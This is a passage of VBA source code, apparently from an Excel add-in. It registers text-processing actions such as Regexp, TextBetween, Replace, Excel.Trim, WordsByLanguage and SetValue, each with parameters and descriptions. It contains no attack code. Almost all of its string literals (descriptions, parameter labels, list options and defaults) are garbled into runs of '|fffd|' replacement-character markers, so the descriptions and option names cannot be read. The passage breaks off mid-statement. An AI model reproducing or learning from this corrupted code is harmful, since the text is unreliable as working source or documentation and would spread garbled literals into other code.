        .AddParameter "Delimiter", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Index", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", _
                      Array("1", "2", "3", "4", "5", "last", "last-1", "last-2", "last-3", "2 ifexist", "3 ifexist", "last ifexist"), "1"
        .AddParameter "VarNames", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |"
    End With


    With AAs.AddAction(fc_Text, "TextBetween", "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| ...")
        .Description = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "TextBefore", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "TextAfter", aps_Text, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Index", aps_Combo, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd||fffd|", "1", "2", "3", "last", "last-1"), "|fffd||fffd||fffd|"
        .AddParameter "AddTextBeforeAndAfter", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd|", "|fffd||fffd||fffd|"), "|fffd||fffd||fffd|"
    End With

    With AAs.AddAction(fc_Text, "Regexp", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd|)")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd| (Pattern), |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd| 3 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| 0) |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Regexp." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|," & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|) - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| replace - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|), |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, $1$2, - |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| 2 |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|)." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: http://www.nncron.ru/help/RU/add_info/regexp.htm"
        .AddParameter "Pattern", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd| Regexp", , , True
        .AddParameter "IndexOrDelimiter", aps_Combo, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("", "0", "1", "2", ", ", "; ", "{NL}", "{LF}", "replace")
        .AddParameter "Replace", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "MatchCase", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd|", "|fffd||fffd||fffd|"), "|fffd||fffd||fffd|"
    End With

    With AAs.AddAction(fc_Text, "AddPrefixAndSuffix", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|."
        .AddParameter "Prefix", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
        .AddParameter "Suffix", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
    End With

    With AAs.AddAction(fc_Text, "Replace", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| 1 |fffd||fffd||fffd| 2 |fffd||fffd||fffd||fffd||fffd||fffd|)"
        .AddParameter "What", aps_Text, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Replacement", aps_Text, "|fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Count", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd||fffd|", "1", "2", "3", "4"), "|fffd||fffd||fffd|"
    End With

    With AAs.AddAction(fc_Text, "RemoveExtraChars", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML |fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd| |fffd|.|fffd|. |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)," & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| {NL} (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)." & vbNewLine & vbNewLine & _
                       "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd|_123__34_7__8__|fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|_|fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd|123_34_7_8|fffd|"
        .AddParameter "Value", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
    End With

    With AAs.AddAction(fc_Text, "Excel.Trim", "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|  |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|     |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|  |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "ReplaceLineFeeds", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd|", Array("", " "), ""
        .AddParameter "ReplaceTabs", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd|", Array("", " "), " "
    End With

    With AAs.AddAction(fc_Text, "ReplaceChars", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "PS: |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Charlist", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Replacement", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
    End With

    With AAs.AddAction(fc_Text, "WordsOrCharacters", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|/|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|/|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", True)
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|), |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|," & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
        .AddParameter "Mode", aps_List, "|fffd||fffd||fffd| |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", _
                                                                  "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"), "|fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "FirstIndex", aps_Combo, "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|/|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", COUNT_ARRAY, "1"
        .AddParameter "Count", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|/|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd||fffd|", "1", "2", "3", "4", "5"), "1"
        .AddParameter "Action", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| ~"), "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End With

    With AAs.AddAction(fc_Text, "WordsByLanguage", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|/|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|), |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| 1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd|)."
        .AddParameter "Language", aps_List, "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|", Array("|fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"), "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Min", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|", COUNT_ARRAY, "1"
        .AddParameter "Max", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|"
    End With

    With AAs.AddAction(fc_Text, "SetValue", "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & vbNewLine & _
